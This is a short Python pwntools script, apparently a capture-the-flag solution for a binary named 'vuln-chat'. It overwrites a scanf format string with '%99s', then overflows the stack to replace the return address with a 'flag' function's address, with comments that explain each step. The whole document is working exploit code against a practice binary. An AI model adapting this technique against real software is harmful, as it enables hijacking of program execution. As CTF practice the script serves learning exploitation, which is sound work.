from pwn import *
context.terminal = ['tmux', 'splitw', '-h']

p = process('./vuln-chat')
gdb.attach(p,'''break *0x080485b6
break *0x0804865d
''')

flag = 0x804856b

# find offset of format string overflow.
buf = '\x41' * 20
buf += "%99s"

# find EIP overflow.
buf2 = ""
buf2 += "\x41" * 49
buf2 += p32(flag)

p.recvline()
p.sendline(buf)

# Overwrite the format string. Inserting 99 spaces before the string,
# allowing us to insert more characters and overflow ret address.

# 0x8048634 <main+170>    call   __isoc99_scanf@plt <__isoc99_scanf@plt>
#       format: 0xffb93ce3 <- '%99s'
#       vararg: 0xffb93cbb <- 0x486b208
p.recvline()
p.sendline(buf2)

p.interactive()
